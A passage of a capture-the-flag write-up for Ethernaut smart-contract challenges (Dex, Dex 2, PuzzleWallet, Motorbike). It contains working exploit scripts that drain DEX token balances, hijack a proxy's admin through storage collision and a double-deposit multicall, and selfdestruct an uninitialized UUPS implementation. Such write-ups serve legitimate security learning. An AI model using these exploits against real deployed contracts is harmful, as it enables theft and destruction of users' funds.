    return {token1Balance,token2Balance}
}

 function knowTokenValues({token1Balance,token2Balance}){
    return {mostExpensiveToken: token1Balance >= token2Balance ? TOKEN2_ADDRESS : TOKEN1_ADDRESS,cheapestToken:token1Balance < token2Balance ? TOKEN2_ADDRESS : TOKEN1_ADDRESS };
}

async function getSwapValues(tokensWithValues){
    let toSwap  = (await contract.balanceOf(tokensWithValues.mostExpensiveToken,PLAYER)).toNumber();
    let available = (await contract.balanceOf(tokensWithValues.mostExpensiveToken,contract.address)).toNumber();

    // to be able to drain the funds and not stop when we got too much tokens.
    if(toSwap>available)toSwap=available;

    return toSwap;
}


async function drainFunds(){
    
    let flag=true; // check condition

    // approving otherwise you will get an error due to how ERC20 works.
    await contract.approve(contract.address,10000,{from:PLAYER});

    while(flag){
        const balances = await getBalances();
        const tokenValues =  knowTokenValues(balances);
        const toSwap = await getSwapValues(tokenValues);
        await contract.swap(tokenValues.mostExpensiveToken,tokenValues.cheapestToken,toSwap,{from:PLAYER});
        console.log(`swapped ${toSwap} ${tokenValues.mostExpensiveToken} for  ${tokenValues.cheapestToken}`);

        flag = token1Balance*token2Balance>0;
    }
    
    console.log("Hacked !")
}


module.exports = async  function(deployer) {
  
  contract = await contractABI.at("0xBa71E2eEF0D68C5aBCDe6dF3EEf9377b9eD9E78C"); 
  await drainFunds();
};
```

![Dex console](images/852281f645c829a2d76b966618bbb6c25f1c4721506ecca9de0e7e6ef4fab42f.png)  

## Dex 2

## Challenge Description

Same as Dex v1 but now we need to drain both tokens.

### Analysis

Same here but we got one less check that makes it possible to inject a third token and thus draining both contract's main tokens' balance.

![Dex 2 Function](images/aeb9bb0ecc92f4b707acbc9170c3bd3355c4361d3523704a799bc8717093366d.png)  

### Exploitation

```js
const contractABI = artifacts.require("Dex");

let contract ;
let TOKEN1_ADDRESS = "0x954aB18d300D8FFE76a2eFE7B36fcD6EF36825c7";
let TOKEN2_ADDRESS = "0xE651aD37ac31B03F7B49036248A29DC75D0093E6";

const TOKEN3_ADDRESS= "0xfe5A0de02e7c76f2A51e3d297e65ccE784787538"

let PLAYER='0x84e7a3679A82C2766Ff8382862ab883FF9460307'

async function getBalances(){
    const token1Balance = (await contract.balanceOf(TOKEN1_ADDRESS,contract.address)).toNumber();
    const token2Balance = (await contract.balanceOf(TOKEN2_ADDRESS,contract.address)).toNumber();
    console.log(`Current Balances for contract : A : ${token1Balance} \t B : ${token2Balance}`);
    return {token1Balance,token2Balance}
}

async function knowTokenValues({token1Balance,token2Balance}){
    return {mostExpensiveToken: token1Balance >= token2Balance ? TOKEN2_ADDRESS : TOKEN1_ADDRESS,cheapestToken:token1Balance < token2Balance ? TOKEN2_ADDRESS : TOKEN1_ADDRESS };
}

async function getSwapValues(tokensWithValues){
    let toSwap  = (await contract.balanceOf(tokensWithValues.mostExpensiveToken,PLAYER)).toNumber();
    let available = (await contract.balanceOf(tokensWithValues.mostExpensiveToken,contract.address)).toNumber();

    // making sure at the end when we get most of balance in one token type we can still get the rest of the tokens.
    if(toSwap>available)toSwap=available;

    return toSwap;
}


async function drainFunds(){
    
    let flag=true;
    await contract.approve(contract.address,10000,{from:PLAYER});
    while(flag){
        const balances= await getBalances();
        const tokenValues= await knowTokenValues(balances);
        const toSwap = await getSwapValues(tokenValues);
        await contract.swap(tokenValues.mostExpensiveToken,tokenValues.cheapestToken,toSwap,{from:PLAYER});
        console.log(`swapped ${toSwap} ${tokenValues.mostExpensiveToken} for  ${tokenValues.cheapestToken}`);
flag = balances.token1Balance*balances.token2Balance>0;
    }
    // Token2 balance  = 0. Make sure to set the token3 value to the same value as token1 at the end of this loop.

    flag = true;
     TOKEN2_ADDRESS=TOKEN1_ADDRESS;
     TOKEN1_ADDRESS=TOKEN3_ADDRESS;

while(flag){
        const balances= await getBalances();
        const tokenValues= await knowTokenValues(balances);
        const toSwap = await getSwapValues(tokenValues);
        await contract.swap(tokenValues.mostExpensiveToken,tokenValues.cheapestToken,toSwap,{from:PLAYER});
        console.log(`swapped ${toSwap} ${tokenValues.mostExpensiveToken} for  ${tokenValues.cheapestToken}`);

        flag = balances.token1Balance*balances.token2Balance>0;
    }
    
    console.log("Hacked !")
}


module.exports = async  function() {
  
  contract = await contractABI.at("0x5b9777555BDC7bA0Dee12EBB6d0Fc1E6Dc83b20a"); 
  await drainFunds();
}
```

#### Solidity Contract for test and for the token3

Make sure to add a reasonable balance to the instance.

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";

contract SwappableToken is ERC20 {

  constructor( string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    super._approve(owner, spender, amount);
  }
}

// transfer(instanceAddress,ValueYouWant)
```

## PuzzleWallet

### Challenge Description 

> The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.
> Little did they know, their lunch money was at risk…
  You'll need to hijack this wallet to become the admin of the proxy.
  Things that might help::
    Understanding how delegatecalls work and how msg.sender and msg.value behaves when performing one.
    Knowing about proxy patterns and the way they handle storage variables.

### Analysis

We all know that smart contracts code is immutable. Once the smart contract is deployed it cannot be changed that's why companies are spending thousands of dollars to make sure that the smart contract is faultless before deployment. Proxies are on the other hand a way to make smart contracts seem upgradable. By adding a new layer in the form of contract we can now which version accepts incoming calls. The code is long and It took me quite a while to get a grasp of it. So I will be highlighting the most interesting parts

```js
contract PuzzleProxy is UpgradeableProxy {
    // Getting to know the storage's layout of our contract
    address public pendingAdmin;
    address public admin;
    ...

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    ...

    contract PuzzleWallet {
        // PuzzleWallet storage's layout
    using SafeMath for uint256;
    address public owner;
    ...

        modifier onlyWhitelisted {
           require(whitelisted[msg.sender], "Not whitelisted");
            _;
        }

      // Can change the storage slot[1]
      function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      // contract's balance should be 0, but wait how much is it now ? 
      require(address(this).balance == 0, "Contract balance is not 0");
      ...

      // only owner can add to white list
      function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        ...

        // You should be in whitelisted to be here
        function multicall(bytes[] calldata data) external payable onlyWhitelisted {
            ...
            assembly {
                // for more low level ops
                selector := mload(add(_data, 32))
            }
            ...
            // deposit can only be called once 
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            ...
            // To not mistake it for the normal contract to contract delegate let's call it selfDelegate.
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}


```

Following the inheritance tree I found finally how the proxy call the real implementation. It was hinted in the challenge description too.

```js
  let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
```

Okay let's sum it up in a diagram.

![PuzzleWallet diagram](images/9b067dbdb383316b6e46909a1bc3a9d8df1c699f4c6091286b753b9fd2e54fcc.png)  

delegateCall can create big messes if we are not careful to the storage layout like we have seen in previous challenges. Let's inspect the storage layout for both contracts.

![PuzzleWallet storage](images/f6f56436b637fed9a8b0a7f1353a0da755a55af222edb26ed38c71fb3d76435e.png)  

`owner` and `pendingAdmin` both are at the slot[0] which is a very big problem. We can manipulate the pendingAdmin so when we `puzzleWalletAddress.delegateCall` we became the owner of the puzzleWallet contract ! huuuge.

We will be using the `proposeNewAdmin` to set the `pendingAdmin` value.

Okay so now we can execute `owner` functions. Let's not forget our goal is to become the `owner` of the *Proxy* contract. Let's look for the function that can set `slot[1]` of the storage in both contracts.

```js
 function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      // contract's balance should be 0, but wait how much is it now ? 
      require(address(this).balance == 0, "Contract balance is not 0");
      ...
 }
```

So first of all we need to be `whitelisted`. We can do that

```js
await contract.addToWhitelist(player);
```

Second we need to make the contract balance to 0. `await web3.eth.getBalance(instance)` will return **0.001** ethers as balance. The `execute` function won't allow such a thing as we can only withdraw what we did deposit (It's tracked in storage variable `balances`). The only way to drain funds is to have more `balance` than the amount we deposited.

If we can't call deposit multiple times in one `multicall` how about we do it but by adding another layer of `multicall`

![PuzzleWallet call hiearchy](images/bc95441a9b162a8b1494771895c5a3385ec0e2be3c4d26376c351eae4a5f5d1d.png)  

This allows to have the double of the msg.value as balance. Okay so we said we had **0.001** ethers as contract balance ? let's deposit 0.001 to our account so we can drain it. ( we will have the same value for our balance and the contract's ) . By having the contract's balance as 0 we can simply set the owner ow I mean maxBalance to our player account to **hijack the proxy**.

### Exploit

1. become the owner of the contract
2. become whitelisted
3. deposit the balance of the contract with multiple calls
4. withdraw all funds
5. setMaxBalance as our address

> The proxy is completely transparent this is possible by loading the ABI of the PuzzleWallet and using the address of the proxy. Don't get confused the address is the proxy's !

```js
const proposeAdminCall= web3.eth.abi.encodeFunctionCall({
name: 'proposeNewAdmin',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: '_newAdmin'
        }
    ]
},player)

await web3.eth.sendTransaction({data:proposeAdminCall,from:player,to:instance});

await contract.addToWhitelist(player);

// getting the deposit call data

const depositData = (await contract.methods('deposit()').request()).data

const multiCallData = (await contract.methods('multicall(bytes[])').request([depositData])).data

await contract.multicall([multicallData,multicallData],{value:toWei('0.001')}); // adding to our balance

await contract.execute(player,toWei('0.002'),'0x0'); // Draining funds

await contract.setMaxBalance(player) // It will convert upon call 
```

Challenge solved ✅

## Motorbike

## Challenge Description

> Ethernaut's motorbike has a brand new upgradeable engine design. 
>  Would you be able to selfdestruct its engine and make the motorbike unusable ?
>Things that might help:
    EIP-1967
    UUPS upgradeable pattern
    Initializable contract

## Analysis

To solve this challenge, we need to be familiar with both [Initializable](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol) and most importantly  the [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967)

After going through all the reading material, as usual I drew the diagram to understand the core logic of the contracts.

![Motorbike Diagram](images/3ac10a42b6cb747f06aad171856c6d4814105583603857fbc5fd1e2549969c23.png)  

After drawing the diagram, I had many unanswered questions the most important one did we `initialize` the engine contract or not !
I really know where the address of the *Engine* contract is in storage so I can check that !

```js
const engineAddress = await web3.eth.getStorageAt(instance,'0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc');

// let's check the value
await web3.eth.call({to:engineAddress,from:player,data:web3.eth.abi.encodeFunctionSignature('upgrader()')})
// returned 0x000000
// the initialize() wasn't called and that's our exploit !
```

### Exploitation

1. initialize the *Engine* contract so we become the **upgrader**.
2. upgrade our *Engine* contract to our bomb contract ( which will selfdestruct )
3. call selfdestruct, the call will be done through *delegateCall* so the actual *Engine* will be destructed !

our evil contract

```js
contract BombEngine { 
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function destruct() public {
        selfdestruct( payable ( 0x84e7a3679A82C2766Ff8382862ab883FF9460307));
    }
}
```

```js
const destructData= web3.eth.abi.encodeFunctionSignature('destruct()');

const data= web3.eth.abi.encodeFunctionCall({
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [{
        type: 'address',
        name: 'newImplementation'
    },{
        type: 'bytes',
        name: 'data'
    }]
}, [bombEngineAddress,destructData]);

await web3.eth.sendTransaction({to:engineAddress,from:player,data:data})

// You can do a random call to the Engine contract it will revert because it's gone !
```

Challenge solved ✅

